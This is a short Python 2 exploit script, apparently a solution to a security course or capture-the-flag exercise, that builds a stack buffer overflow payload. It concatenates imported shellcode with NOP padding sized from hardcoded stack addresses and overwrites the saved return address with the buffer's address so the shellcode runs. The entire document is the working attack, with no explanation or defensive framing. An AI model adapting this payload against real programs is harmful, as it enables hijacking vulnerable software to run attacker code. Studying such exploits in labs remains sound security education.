from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = 0xbffef3fc

print shellcode + '\x90' * (ebp - buf + 4 - len(shellcode)) + pack("<I", 0xbffef3fc)
